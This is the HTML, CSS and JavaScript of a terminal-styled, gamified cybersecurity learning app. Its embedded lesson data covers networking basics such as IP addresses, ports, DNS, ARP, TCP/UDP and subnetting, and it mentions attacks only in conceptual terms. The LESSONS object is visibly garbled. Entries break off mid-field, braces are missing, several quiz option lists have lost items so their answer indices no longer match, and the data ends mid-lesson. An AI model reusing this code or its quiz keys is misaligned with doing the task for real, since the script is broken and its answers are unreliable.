<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>root@academy: ~ </title>
<style>
@font-face {
  font-family: 'JBM';
  src: local('JetBrains Mono');
}
:root{
  --bg:        #090d0b;
  --bg-raised: #0f1512;
  --panel:     #111815;
  --panel-2:   #0d1310;
  --line:      #223028;
  --line-soft: #182019;
  --text:      #c9d6cd;
  --text-dim:  #7f948a;
  --text-faint:#556359;
  --green:     #4ff08a;
  --green-dim: #2c8f57;
  --amber:     #ffb454;
  --amber-dim: #a67735;
  --cyan:      #5ad7ff;
  --cyan-dim:  #3a8aa8;
  --red:       #ff6b6b;
  --red-dim:   #a84040;
  --purple:    #c792ea;
  --radius-sm: 3px;
  --radius-md: 5px;
  --mono: 'JetBrains Mono', 'Fira Code', ui-monospace, 'SFMono-Regular', Menlo, Consolas, monospace;
}

*{ box-sizing:border-box; }
html,body{
  margin:0; padding:0;
  background:var(--bg);
  color:var(--text);
  font-family:var(--mono);
  font-size:14px;
  line-height:1.6;
  -webkit-font-smoothing:antialiased;
}
body{
  background-image:
    radial-gradient(ellipse 80% 50% at 50% -10%, rgba(79,240,138,0.05), transparent),
    repeating-linear-gradient(0deg, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 2px);
  min-height:100vh;
}
::selection{ background:var(--green); color:#04170c; }
a{ color:var(--cyan); text-decoration:none; }
a:hover{ text-decoration:underline; }
button{ font-family:var(--mono); }
::-webkit-scrollbar{ width:10px; height:10px; }
::-webkit-scrollbar-track{ background:var(--bg-raised); }
::-webkit-scrollbar-thumb{ background:var(--line); border-radius:5px; }
::-webkit-scrollbar-thumb:hover{ background:var(--text-faint); }

:focus-visible{
  outline:2px solid var(--cyan);
  outline-offset:2px;
}

/* ---------- utility ---------- */
.hidden{ display:none !important; }
.mono-label{ color:var(--text-faint); font-size:12px; }
.glow-green{ text-shadow:0 0 12px rgba(79,240,138,0.35); }
.blink{ animation:blink 1.1s step-end infinite; }
@keyframes blink{ 50%{ opacity:0; } }
@media (prefers-reduced-motion: reduce){
  *{ animation-duration:0.001ms !important; animation-iteration-count:1 !important; transition-duration:0.001ms !important; }
}

/* ---------- boot screen ---------- */
#boot{
  position:fixed; inset:0; background:var(--bg);
  display:flex; align-items:center; justify-content:center;
  z-index:100; padding:24px;
}
#boot-log{
  width:100%; max-width:680px;
  font-size:13px; line-height:1.7;
  color:var(--green-dim);
  white-space:pre-wrap;
}
#boot-log .ok{ color:var(--green); }
#boot-log .tag{ color:var(--cyan); }
#boot-skip{
  position:fixed; bottom:22px; right:26px;
  background:none; border:1px solid var(--line);
  color:var(--text-dim); padding:6px 12px; border-radius:var(--radius-sm);
  cursor:pointer; font-size:12px;
}
#boot-skip:hover{ border-color:var(--text-dim); color:var(--text); }

/* ---------- login / profile select ---------- */
#login{
  display:none; position:fixed; inset:0; background:var(--bg);
  align-items:center; justify-content:center; z-index:110; padding:24px;
}
.login-card{
  width:100%; max-width:420px;
  background:var(--panel); border:1px solid var(--line);
  border-radius:var(--radius-md); padding:26px 28px;
}
.login-brand{ font-size:12px; color:var(--green); margin-bottom:18px; font-weight:700; }
.login-brand .dim{ color:var(--text-faint); font-weight:400; }
.login-title{ font-size:20px; color:var(--text); margin:0 0 6px; }
.login-sub{ font-size:12.5px; color:var(--text-dim); margin:0 0 16px; }
.login-label{ display:block; font-size:11.5px; color:var(--text-faint); margin:12px 0 5px; }
.login-input{
  width:100%; background:var(--panel-2); border:1px solid var(--line);
  color:var(--text); padding:10px 12px; border-radius:var(--radius-sm);
  font-family:var(--mono); font-size:14px; outline:none;
}
.login-input:focus{ border-color:var(--green-dim); }
.profile-list{ display:flex; flex-direction:column; gap:6px; margin-top:6px; }
.profile-row{
  display:flex; align-items:center; gap:10px;
  padding:11px 12px; border:1px solid var(--line); border-radius:var(--radius-sm);
  background:var(--panel-2); cursor:pointer;
}
.profile-row:hover{ border-color:var(--green-dim); }
.profile-row .profile-glyph{ color:var(--text-faint); flex-shrink:0; }
.profile-row .profile-name{ flex:1; font-size:13.5px; color:var(--text); }
.profile-row .profile-del{
  opacity:0.5; padding:3px 8px; font-size:11px; color:var(--text-faint);
  border-color:var(--line);
}
.profile-row .profile-del:hover{ opacity:1; color:var(--red); border-color:var(--red-dim); }

#switchProfileBtn{ display:flex; align-items:center; gap:6px; white-space:nowrap; }
#switchProfileBtn span{ max-width:90px; overflow:hidden; text-overflow:ellipsis; }
@media (max-width:860px){
  #switchProfileBtn span{ display:none; }
}

/* ---------- app shell ---------- */
#app{ display:none; min-height:100vh; }
#app.ready{ display:flex; flex-direction:column; }

.topbar{
  display:flex; align-items:center; justify-content:space-between;
  padding:10px 18px;
  border-bottom:1px solid var(--line-soft);
  background:var(--bg-raised);
  gap:16px;
  flex-wrap:wrap;
}
.topbar-left{ display:flex; align-items:center; gap:10px; min-width:0; }
.brand{ color:var(--green); font-weight:700; letter-spacing:0.02em; white-space:nowrap; }
.brand .dim{ color:var(--text-faint); font-weight:400; }
.path-crumb{ color:var(--text-faint); font-size:12px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
.path-crumb .seg{ color:var(--text-dim); }
.path-crumb .cur{ color:var(--cyan); }

.topbar-stats{ display:flex; align-items:center; gap:14px; font-size:12.5px; flex-wrap:wrap; }
.stat-chip{
  display:flex; align-items:center; gap:6px;
  border:1px solid var(--line); border-radius:var(--radius-sm);
  padding:4px 9px; background:var(--panel-2);
  white-space:nowrap;
}
.stat-chip b{ color:var(--text); font-weight:600; }
.stat-chip.credits b{ color:var(--amber); }
.stat-chip.level b{ color:var(--green); }
.xp-track{
  width:84px; height:6px; background:var(--line-soft);
  border-radius:3px; overflow:hidden; position:relative;
}
.xp-fill{ height:100%; background:var(--green); border-radius:3px; transition:width .5s ease; }
.streak-flame{ color:var(--amber); }

.layout{ display:flex; flex:1; min-height:0; }

/* ---------- nav ---------- */
.sidenav{
  width:236px; flex-shrink:0;
  border-right:1px solid var(--line-soft);
  background:var(--bg-raised);
  padding:14px 10px;
  overflow-y:auto;
}
.nav-section-label{
  color:var(--text-faint); font-size:11px; padding:10px 8px 4px;
}
.nav-item{
  display:flex; align-items:center; gap:8px;
  padding:7px 9px; margin:1px 0;
  border-radius:var(--radius-sm);
  color:var(--text-dim); cursor:pointer;
  font-size:13px; border:1px solid transparent;
  white-space:nowrap; min-width:0;
}
.nav-item > span:nth-child(2){ overflow:hidden; text-overflow:ellipsis; }
.nav-item:hover{ background:var(--panel); color:var(--text); }
.nav-item.active{
  background:rgba(79,240,138,0.08); color:var(--green);
  border-color:rgba(79,240,138,0.25);
}
.nav-item .glyph{ width:14px; text-align:center; opacity:0.85; flex-shrink:0; }
.nav-item .badge-count{
  margin-left:auto; font-size:10.5px; color:var(--text-faint);
  background:var(--panel-2); border:1px solid var(--line);
  border-radius:8px; padding:1px 6px; flex-shrink:0; white-space:nowrap;
}
.nav-item.locked{ opacity:0.4; cursor:not-allowed; }
.nav-divider{ height:1px; background:var(--line-soft); margin:10px 4px; }

/* ---------- main pane ---------- */
.main{
  flex:1; min-width:0; overflow-y:auto;
  padding:22px 26px 60px;
}
.win{
  background:var(--panel);
  border:1px solid var(--line);
  border-radius:var(--radius-md);
  margin-bottom:18px;
}
.win-title{
  display:flex; align-items:center; gap:8px;
  padding:8px 12px;
  border-bottom:1px solid var(--line-soft);
  color:var(--text-faint); font-size:12px;
}
.win-title .dots{ display:flex; gap:5px; }
.win-title .dot{ width:8px; height:8px; border-radius:50%; background:var(--line); }
.win-body{ padding:16px; }

h1,h2,h3{ font-family:var(--mono); font-weight:700; color:var(--text); margin:0 0 8px; }
h1{ font-size:22px; color:var(--green); }
h2{ font-size:16px; }
h3{ font-size:14px; color:var(--cyan); }
p{ margin:0 0 12px; color:var(--text); }
.prompt-line{ color:var(--text-dim); }
.prompt-line .p1{ color:var(--green); }
.prompt-line .p2{ color:var(--cyan); }

.btn{
  display:inline-flex; align-items:center; gap:7px;
  background:var(--panel-2); border:1px solid var(--line);
  color:var(--text); padding:8px 14px; border-radius:var(--radius-sm);
  cursor:pointer; font-size:13px; font-family:var(--mono);
}
.btn:hover{ border-color:var(--text-dim); }
.btn.primary{ border-color:var(--green-dim); color:var(--green); background:rgba(79,240,138,0.06); }
.btn.primary:hover{ border-color:var(--green); background:rgba(79,240,138,0.12); }
.btn.amber{ border-color:var(--amber-dim); color:var(--amber); }
.btn.amber:hover{ border-color:var(--amber); background:rgba(255,180,84,0.1); }
.btn:disabled{ opacity:0.35; cursor:not-allowed; }
.btn.small{ padding:5px 10px; font-size:12px; }

.pill{
  display:inline-block; font-size:11px; padding:2px 8px;
  border-radius:10px; border:1px solid var(--line);
  color:var(--text-dim);
}
.pill.new{ color:var(--amber); border-color:var(--amber-dim); }
.pill.done{ color:var(--green); border-color:var(--green-dim); }
.pill.locked{ color:var(--text-faint); }

/* ---------- track / lesson cards ---------- */
.track-grid{
  display:grid; grid-template-columns:repeat(auto-fill, minmax(260px,1fr));
  gap:14px;
}
.track-card{
  border:1px solid var(--line); border-radius:var(--radius-md);
  background:var(--panel); padding:16px; cursor:pointer;
  position:relative;
}
.track-card:hover{ border-color:var(--text-dim); }
.track-card .tc-head{ display:flex; justify-content:space-between; align-items:flex-start; gap:8px; }
.track-card h3{ font-size:15px; margin-bottom:4px; }
.track-card p{ font-size:12.5px; color:var(--text-dim); margin-bottom:12px; }
.track-progress-row{ display:flex; align-items:center; gap:8px; font-size:11.5px; color:var(--text-faint); }
.track-bar{ flex:1; height:5px; background:var(--line-soft); border-radius:3px; overflow:hidden; }
.track-bar-fill{ height:100%; border-radius:3px; }

.lesson-list{ display:flex; flex-direction:column; gap:6px; }
.lesson-row{
  display:flex; align-items:center; gap:10px;
  padding:10px 12px; border:1px solid var(--line); border-radius:var(--radius-sm);
  cursor:pointer; background:var(--panel-2);
}
.lesson-row:hover{ border-color:var(--text-dim); }
.lesson-row.locked{ cursor:not-allowed; opacity:0.45; }
.lesson-row .ln-icon{ width:20px; text-align:center; color:var(--text-faint); flex-shrink:0; }
.lesson-row.done .ln-icon{ color:var(--green); }
.lesson-row .ln-body{ flex:1; min-width:0; }
.lesson-row .ln-title{ font-size:13.5px; }
.lesson-row .ln-meta{ font-size:11px; color:var(--text-faint); }

/* ---------- lesson viewer ---------- */
.lesson-header{ display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; flex-wrap:wrap; gap:8px; }
.back-link{ color:var(--text-dim); cursor:pointer; font-size:12.5px; }
.back-link:hover{ color:var(--cyan); }
.concept-block{ margin-bottom:18px; }
.concept-block code, p code, li code{
  background:var(--panel-2); border:1px solid var(--line-soft);
  padding:1px 5px; border-radius:3px; color:var(--amber); font-size:12.5px;
}
.concept-block pre{
  background:var(--panel-2); border:1px solid var(--line-soft);
  border-radius:var(--radius-sm); padding:12px 14px; overflow-x:auto;
  font-size:12.5px; color:var(--cyan); margin:10px 0;
}
.concept-block ul,.concept-block ol{ padding-left:20px; margin:0 0 12px; }
.concept-block li{ margin-bottom:5px; }
.callout{
  border-left:2px solid var(--cyan-dim); background:rgba(90,215,255,0.05);
  padding:9px 12px; border-radius:0 var(--radius-sm) var(--radius-sm) 0;
  font-size:12.5px; color:var(--text-dim); margin:12px 0;
}
.callout.warn{ border-color:var(--amber-dim); background:rgba(255,180,84,0.05); }

.quiz-q{ font-size:14px; margin-bottom:12px; color:var(--text); }
.quiz-opts{ display:flex; flex-direction:column; gap:8px; margin-bottom:14px; }
.quiz-opt{
  text-align:left; padding:10px 12px; border:1px solid var(--line);
  border-radius:var(--radius-sm); background:var(--panel-2); color:var(--text);
  cursor:pointer; font-size:13px; font-family:var(--mono);
}
.quiz-opt:hover{ border-color:var(--text-dim); }
.quiz-opt.correct{ border-color:var(--green); background:rgba(79,240,138,0.1); color:var(--green); }
.quiz-opt.wrong{ border-color:var(--red); background:rgba(255,107,107,0.08); color:var(--red); }
.quiz-opt:disabled{ cursor:default; }
.feedback{ font-size:13px; padding:10px 12px; border-radius:var(--radius-sm); margin-bottom:12px; }
.feedback.good{ background:rgba(79,240,138,0.08); color:var(--green); border:1px solid var(--green-dim); }
.feedback.bad{ background:rgba(255,107,107,0.08); color:var(--red); border:1px solid var(--red-dim); }

.reward-toast{
  position:fixed; top:18px; left:50%; transform:translateX(-50%) translateY(-140%);
  background:var(--panel); border:1px solid var(--green-dim);
  padding:10px 18px; border-radius:var(--radius-md);
  font-size:13px; color:var(--green); z-index:200;
  box-shadow:0 8px 30px rgba(0,0,0,0.5);
  transition:transform .35s cubic-bezier(.2,.9,.3,1.2);
  display:flex; gap:14px; align-items:center;
}
.reward-toast.show{ transform:translateX(-50%) translateY(0); }

/* ---------- terminal ---------- */
.term-wrap{
  background:#05080600; border:1px solid var(--line); border-radius:var(--radius-md);
  overflow:hidden;
}
.term-screen{
  background:#070b09; padding:14px 16px; height:440px; overflow-y:auto;
  font-size:13px; line-height:1.6;
}
.term-line{ white-space:pre-wrap; word-break:break-word; }
.term-line.cmd{ color:var(--text); }
.term-line.cmd .tprompt{ color:var(--green); }
.term-line.cmd .tpath{ color:var(--cyan); }
.term-line.out{ color:var(--text-dim); }
.term-line.err{ color:var(--red); }
.term-line.sys{ color:var(--amber); }
.term-input-row{ display:flex; align-items:center; gap:6px; }
.term-input-row .tprompt{ color:var(--green); flex-shrink:0; }
.term-input-row .tpath{ color:var(--cyan); flex-shrink:0; }
#term-input{
  flex:1; background:transparent; border:none; outline:none;
  color:var(--text); font-family:var(--mono); font-size:13px; caret-color:var(--green);
}
.term-hint-bar{
  display:flex; justify-content:space-between; align-items:center;
  padding:7px 14px; border-top:1px solid var(--line-soft);
  background:var(--panel-2); font-size:11.5px; color:var(--text-faint);
  flex-wrap:wrap; gap:8px;
}

.mission-brief{
  border:1px solid var(--line); border-radius:var(--radius-md);
  padding:14px 16px; margin-bottom:14px; background:var(--panel);
}
.mission-brief .mb-obj{ color:var(--text-dim); font-size:12.5px; margin-top:6px; }
.mission-list{ display:flex; flex-direction:column; gap:6px; }

/* ---------- shop ---------- */
.shop-tabs{ display:flex; gap:6px; margin-bottom:14px; flex-wrap:wrap; }
.shop-tab{
  padding:6px 13px; border:1px solid var(--line); border-radius:16px;
  color:var(--text-dim); font-size:12.5px; cursor:pointer; background:var(--panel-2);
}
.shop-tab.active{ color:var(--green); border-color:var(--green-dim); background:rgba(79,240,138,0.07); }
.shop-grid{ display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:12px; }
.shop-item{
  border:1px solid var(--line); border-radius:var(--radius-md); padding:14px;
  background:var(--panel); display:flex; flex-direction:column; gap:8px;
}
.shop-item .si-top{ display:flex; justify-content:space-between; align-items:flex-start; gap:8px; }
.shop-item h3{ font-size:13.5px; margin:0; }
.shop-item p{ font-size:12px; color:var(--text-dim); margin:0; flex:1; }
.si-price{ color:var(--amber); font-size:13px; }
.si-footer{ display:flex; justify-content:space-between; align-items:center; margin-top:auto; }

/* ---------- character sheet ---------- */
.char-grid{ display:grid; grid-template-columns:1fr 1fr; gap:16px; }
@media (max-width:760px){ .char-grid{ grid-template-columns:1fr; } }
.stat-block{ border:1px solid var(--line); border-radius:var(--radius-md); padding:14px; background:var(--panel); }
.stat-row{ display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px dashed var(--line-soft); font-size:12.5px; }
.stat-row:last-child{ border-bottom:none; }
.stat-row .v{ color:var(--text); }
.cert-grid{ display:grid; grid-template-columns:repeat(auto-fill,minmax(140px,1fr)); gap:10px; margin-top:10px; }
.cert-badge{
  border:1px solid var(--line); border-radius:var(--radius-sm); padding:10px;
  text-align:center; font-size:11.5px; color:var(--text-faint);
}
.cert-badge.earned{ color:var(--green); border-color:var(--green-dim); background:rgba(79,240,138,0.05); }
.cert-badge .cb-icon{ font-size:20px; margin-bottom:4px; }

/* ---------- mobile ---------- */
.hamburger{ display:none; background:none; border:1px solid var(--line); color:var(--text); padding:6px 10px; border-radius:var(--radius-sm); cursor:pointer; }
@media (max-width:860px){
  .hamburger{ display:inline-flex; }
  .sidenav{
    position:fixed; top:0; left:0; bottom:0; z-index:60;
    transform:translateX(-100%); transition:transform .25s ease;
    box-shadow:20px 0 40px rgba(0,0,0,0.4);
  }
  .sidenav.open{ transform:translateX(0); }
  .nav-scrim{ display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:55; }
  .nav-scrim.show{ display:block; }
  .topbar-stats{ font-size:11px; gap:8px; }
  .xp-track{ width:56px; }
  .main{ padding:16px 14px 60px; }
  .term-screen{ height:340px; }
}
</style>
</head>
<body>

<div id="login"></div>

<div id="boot">
  <div id="boot-log"></div>
  <button id="boot-skip">skip [enter]</button>
</div>

<div id="app">
  <div class="topbar">
    <div class="topbar-left">
      <button class="hamburger" id="hamburgerBtn">☰</button>
      <span class="brand">academy<span class="dim">@</span>root<span class="dim">:</span></span>
      <span class="path-crumb" id="pathCrumb">~/dashboard</span>
    </div>
    <div class="topbar-stats" id="topStats"></div>
    <button class="btn small" id="switchProfileBtn" onclick="switchProfile()" title="Switch profile">⇄ <span id="profileNameLabel"></span></button>
  </div>

  <div class="layout">
    <div class="nav-scrim" id="navScrim"></div>
    <nav class="sidenav" id="sideNav"></nav>
    <main class="main" id="mainPane"></main>
  </div>
</div>

<div class="reward-toast" id="rewardToast"></div>

<script>

/* ===== LESSONS_merged.js ===== */
const LESSONS = {
  "foundations": [
    {
      "id": "f1",
      "title": "What even is a network?",
      "concept": "\n  <p>A <b>network</b> is just two or more devices that can send data back and forth. Your phone, laptop, and router at home form a small network. The internet is a network of networks — millions of smaller networks all agreeing to speak the same languages.</p>\n  <p>Every device on a network needs an address so others know where to send data. That address is called an <b>IP address</b> — something like <code>192.168.1.14</code> or <code>142.250.183.78</code>.</p>\n  <ul>\n    <li><b>Private IP</b> — only valid inside your local network (home, office). Ranges like <code>192.168.x.x</code> or <code>10.x.x.x</code>.</li>\n    <li><b>Public IP</b> — the address your whole network shows to the internet, assigned by your ISP.</li>\n  </ul>\n  <div class=\"callout\">Think of a private IP like an office extension (call \"ext. 214\") and a public IP like the building's main phone number. Everyone dials the main number, then gets routed internally.</div>",
      "check": {
        "type": "quiz",
        "q": "Which of these is a private IP address, only usable inside a local network?",
        "opts": [
          "8.8.8.8",
          "192.168.0.12",
          "142.250.72.14",
          "1.1.1.1"
        ],
        "correct": 1,

      "id": "f2",
      "title": "Ports & protocols",
      "concept": "\n  <p>An IP address gets data to the right <b>device</b>. A <b>port</b> gets it to the right <b>program</b> on that device. Ports are numbered 0–65535.</p>\n  <p>Some ports are so standardized they're basically street addresses everyone recognizes:</p>\n  <ul>\n    <li><code>80</code> — HTTP (unencrypted web traffic)</li>\n    <li><code>443</code> — HTTPS (encrypted web traffic)</li>\n    <li><code>22</code> — SSH (secure remote login)</li>\n    <li><code>53</code> — DNS (domain name lookups)</li>\n    <li><code>21</code> — FTP (file transfer, usually insecure)</li>\n  </ul>\n  <p>A <b>protocol</b> is the agreed-upon language for that conversation. HTTP is a protocol. So is TCP, the lower-level protocol that HTTP rides on top of, which guarantees data arrives complete and in order.</p>\n  <div class=\"callout warn\">Attackers scan ports to find out what's \"listening\" on a machine — an open port means a service is running there, and every running service is a potential door.</div>",

      "id": "f3",
      "title": "DNS: the internet's phonebook",
      "concept": "\n  <p>Nobody memorizes IP addresses. Instead we type <code>example.com</code> and <b>DNS (Domain Name System)</b> translates that into an IP address behind the scenes.</p>\n  <ol>\n    <li>You type <code>bank.com</code> into your browser.</li>\n    <li>Your device asks a DNS resolver \"what's the IP for bank.com?\"</li>\n    <li>The resolver replies with something like <code>93.184.216.34</code>.</li>\n    <li>Your browser connects directly to that IP.</li>\n  </ol>\n  <p>This lookup step is a favorite attack surface. <b>DNS spoofing</b> tricks a victim into resolving a domain to the attacker's IP instead of the real one — the address bar can even still say the right domain while you're actually talking to a fake server.</p>",

      "id": "f4",
      "title": "HTTP requests, up close",
      "concept": "\n  <p>Every time a browser loads a page, it sends an <b>HTTP request</b> and the server sends back an <b>HTTP response</b>. Understanding this shape is the single most useful skill for web security later.</p>\n  <pre>GET /login HTTP/1.1\nHost: example.com\nCookie: session=a91f...\nUser-Agent: Mozilla/5.0...\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: session=a91f...</pre>\n  <p>Key parts to recognize:</p>\n  <ul>\n    <li><b>Method</b> — <code>GET</code> (fetch data), <code>POST</code> (send data), <code>PUT</code>, <code>DELETE</code>, etc.</li>\n    <li><b>Headers</b> — metadata like cookies, content type, auth tokens.</li>\n    <li><b>Status code</b> — <code>200</code> OK, <code>301</code> redirect, <code>403</code> forbidden, <code>404</code> not found, <code>500</code> server error.</li>\n  </ul>",

      "id": "f6",
      "title": "Permissions: who can do what",
      "concept": "\n  <p>Linux files carry permissions for three groups: the <b>owner</b>, the <b>group</b>, and <b>everyone else</b>. Each group can have <b>r</b>ead, <b>w</b>rite, and e<b>x</b>ecute rights.</p>\n  <pre>-rwxr-xr--  1 root  staff  secret.sh\n │└┬┘└┬┘└┬┘\n │ │  │  └─ others: r-- (read only)\n │ │  └──── group:  r-x (read + execute)\n │ └─────── owner:  rwx (read, write, execute)\n └───────── file type (- = regular file, d = directory)</pre>\n  <p>Misconfigured permissions are one of the most common real-world vulnerabilities — a config file with secrets, readable by \"everyone,\" is a gift to any attacker who gets even minimal access to the box.</p>",

      "id": "f9",
      "title": "The OSI model, without the pain",
      "concept": "\n  <p>The <b>OSI model</b> splits networking into 7 conceptual layers. Nobody memorizes all 7 perfectly in daily work, but the mental model is genuinely useful for troubleshooting and for understanding where an attack \"lives.\"</p>\n  <pre>7. Application   — HTTP, DNS, the actual programs\n6. Presentation  — encryption, encoding\n5. Session       — managing connections\n4. Transport     — TCP/UDP, ports\n3. Network       — IP addresses, routing\n2. Data Link     — MAC addresses, switches\n1. Physical      — cables, radio waves, electrons</pre>\n  <p>A firewall filtering by port operates around layer 4. A web application firewall inspecting HTTP content operates at layer 7. Knowing the layer helps you reason about what a given security control can and can't see.</p>\n  <div class=\"callout\">Mnemonic some people use: \"Please Do Not Throw Sausage Pizza Away\" (Physical, Data Link, Network, Transport, Session, Presentation, Application).</div>",
      "check": {
        "type": "quiz",
        "q": "A switch that forwards traffic based on MAC addresses operates primarily at which OSI layer?",

          "Layer 4 (Transport)",

          "Layer 1 (Physical)"

        "correct": 2,
        "explain": "MAC addresses are a Data Link (Layer 2) concept — switches use them to forward frames within a local network."
      },
      "xp": 22,
      "credits": 9

    {
      "id": "f10",
      "title": "MAC addresses vs. IP addresses",
      "concept": "\n  <p>Every network interface has a <b>MAC (Media Access Control) address</b> — a hardware identifier like <code>3C:22:FB:4A:9E:01</code>, burned in at manufacture. This is different from an IP address in an important way:</p>\n  <ul>\n    <li><b>MAC address</b> — identifies a device on the <i>local</i> network segment. Doesn't change when you move networks.</li>\n    <li><b>IP address</b> — identifies a device's location on a network, and can change depending on which network you're connected to.</li>\n  </ul>\n  <p>When your computer sends data to another device on the same local network, it actually needs the destination's MAC address — this is resolved using <b>ARP (Address Resolution Protocol)</b>, which asks \"who has IP x.x.x.x? Tell me your MAC.\"</p>\n  <div class=\"callout warn\">This is the exact mechanism ARP spoofing abuses — sending fake \"I have that IP, here's my MAC\" replies to redirect local traffic.</div>",
      "check": {

          "Assigns IP addresses to new devices"
        ],
        "correct": 2,
        "explain": "ARP maps IP addresses to MAC addresses within a local network segment — it's a different job than DNS, which resolves domain names."
      },

    {
      "id": "f11",
      "title": "TCP vs. UDP",
      "concept": "\n  <p>Both are transport-layer protocols that ride under application protocols, but they trade off reliability against speed:</p>\n  <ul>\n    <li><b>TCP (Transmission Control Protocol)</b> — connection-oriented. Establishes a handshake, guarantees delivery and order, retransmits lost packets. Slower, but reliable. Used for web browsing, email, file transfer.</li>\n    <li><b>UDP (User Datagram Protocol)</b> — connectionless. Fire-and-forget, no guarantee of delivery or order. Faster, lower overhead. Used for video streaming, online gaming, DNS lookups.</li>\n  </ul>\n  <p>The TCP handshake, for reference, is the famous \"three-way handshake\":</p>\n  <pre>Client  → SYN        → Server\nClient  ← SYN-ACK    ← Server\nClient  → ACK        → Server\n   (connection established)</pre>\n  <div class=\"callout\">A SYN flood attack abuses this handshake — sending endless SYN packets without completing the handshake, exhausting the server's connection table.</div>",
      "check": {
        "type": "quiz",
        "q": "Why would a video game use UDP instead of TCP?",
        "opts": [

          "Losing a rare, old packet doesn't matter as much as getting new data fast — UDP trades reliability for speed",
          "UDP doesn't use IP addresses"
        ],
        "correct": 2,
        "explain": "Real-time applications often prefer dropping a stale packet over waiting for TCP retransmission, since a delayed old update is often worse than a missing one."
      },
      "xp": 24,
      "credits": 10
    },
    {
      "id": "f12",
      "title": "Subnetting basics",
      "concept": "\n  <p>A <b>subnet mask</b> (like <code>255.255.255.0</code>, often written as <code>/24</code>) splits an IP address into a \"network\" part and a \"host\" part — determining which addresses live on the same local segment.</p>\n  <pre>192.168.1.0/24\n=  Network: 192.168.1.0\n   Usable hosts: 192.168.1.1 – 192.168.1.254\n   Broadcast: 192.168.1.255</pre>\n  <p>The <code>/24</code> means the first 24 bits are the network portion, leaving 8 bits (256 addresses, minus network+broadcast = 254 usable) for hosts.</p>\n  <div class=\"callout\">Why this matters for security: devices on the same subnet can typically reach each other directly. Segmenting a network into smaller subnets (VLANs) limits how far an attacker can move after breaching one device — this is the basis of \"network segmentation.\"</div>",
      "check": {
        "type": "quiz",
        "q": "Why is network segmentation (splitting into subnets/VLANs) a security best practice?",
        "opts": [

        "explain": "Segmentation contains breaches — a compromised device in one segment can't automatically reach everything else on the network."

    {
      "id": "f13",
      "title": "Routers, switches, and how packets travel",
      "concept": "\n  <p>Data doesn't teleport from your laptop to a server across the world — it hops through many devices:</p>\n  <ul>\n    <li><b>Switch</b> — connects devices within one local network, forwarding traffic based on MAC address.</li>\n    <li><b>Router</b> — connects different networks together, forwarding traffic based on IP address, and is usually where your home network meets the internet.</li>\n  </ul>\n  <p>Each hop a packet takes between routers is visible with a <b>traceroute</b>, which shows every router along the path to a destination — useful for diagnosing where traffic is slow, or unexpectedly routed somewhere odd.</p>\n  <div class=\"callout\">Every router a packet passes through is a place data could theoretically be inspected or intercepted — one more reason end-to-end encryption matters regardless of how \"trusted\" the path looks.</div>",

    {
      "id": "f14",
      "title": "Environment variables & config files",
      "concept": "\n  <p>Programs need configuration — API keys, database passwords, feature flags — without hardcoding them into source code. Two common patterns:</p>\n  <ul>\n    <li><b>Environment variables</b> — key-value pairs available to a running process, e.g. <code>DATABASE_PASSWORD=hunter2</code>, set outside the code itself.</li>\n    <li><b>Config files</b> — files like <code>.env</code>, <code>config.yaml</code>, or <code>settings.json</code> holding the same kind of settings.</li>\n  </ul>\n  <p>This matters enormously for security because of one extremely common real-world mistake: <b>committing secrets to source control</b>. A <code>.env</code> file with real API keys, accidentally pushed to a public GitHub repo, is one of the most common ways credentials leak — bots scan public repos for exactly this, constantly, automatically.</p>\n  <div class=\"callout warn\">This is why <code>.gitignore</code> should always exclude files like <code>.env</code>, and why leaked-secret scanning tools exist as a standard part of modern development pipelines.</div>",

    {
      "id": "f15",
      "title": "How software gets compiled & run",
      "concept": "\n  <p>Understanding roughly how code becomes a running program helps demystify a lot of security terminology later.</p>\n  <ul>\n    <li><b>Source code</b> — human-readable code (Python, C, JavaScript...)</li>\n    <li><b>Compiled languages</b> (C, C++, Rust, Go) — translated ahead of time into machine code the CPU runs directly. Fast, but a whole class of \"memory safety\" bugs (like buffer overflows) live here.</li>\n    <li><b>Interpreted languages</b> (Python, JavaScript, Ruby) — read and executed line-by-line by another program (the interpreter) at runtime. Different bug classes tend to show up (injection-style bugs are common here).</li>\n  </ul>\n  <p>A <b>buffer overflow</b> — one of the most classic vulnerability types — happens when a program writes more data into a fixed-size memory space than it was allocated, overwriting adjacent memory. In the worst case, an attacker can carefully craft that overflow to overwrite a return address and hijack program execution.</p>",

    {
      "id": "f16",
      "title": "Cloud vs. on-premise, in plain terms",
      "concept": "\n  <p>Understanding this distinction matters because security responsibilities literally shift depending on the model:</p>\n  <ul>\n    <li><b>On-premise</b> — you own and run the physical servers. You're responsible for everything: physical security, hardware, OS patching, network config, application security.</li>\n    <li><b>Cloud (e.g. AWS, Azure, GCP)</b> — you rent infrastructure from a provider. Responsibility is split via the <b>Shared Responsibility Model</b>.</li>\n  </ul>\n  <p>Roughly: the cloud provider secures \"the cloud itself\" (physical datacenters, host infrastructure), while you secure \"what you put in the cloud\" (your data, your configurations, your access controls). A staggering number of real cloud breaches come from misunderstanding this line — assuming the provider handles something that was actually the customer's job.</p>\n  <div class=\"callout warn\">The single most common cloud security failure: a storage bucket (like an AWS S3 bucket) left publicly accessible by misconfiguration, exposing sensitive data to the entire internet.</div>",

    {
      "id": "f17",
      "title": "What is an API, really?",
      "concept": "\n  <p>An <b>API (Application Programming Interface)</b> is a defined way for one piece of software to talk to another. When your weather app shows a forecast, it's not calculating weather itself — it's calling a weather service's API and displaying the response.</p>\n  <p>The dominant style on the web is <b>REST</b>, where you interact with \"resources\" using HTTP methods:</p>\n  <pre>GET    /users/42        → fetch user 42's data\nPOST   /users            → create a new user\nPUT    /users/42          → replace user 42's data\nDELETE /users/42          → delete user 42</pre>\n  <p>APIs are a massive modern attack surface because they're often less scrutinized than the main website — an API might reveal way more data than intended, skip validation the main app has, or lack rate limiting entirely.</p>",

    {
      "id": "f18",
      "title": "Data at rest vs. data in transit",
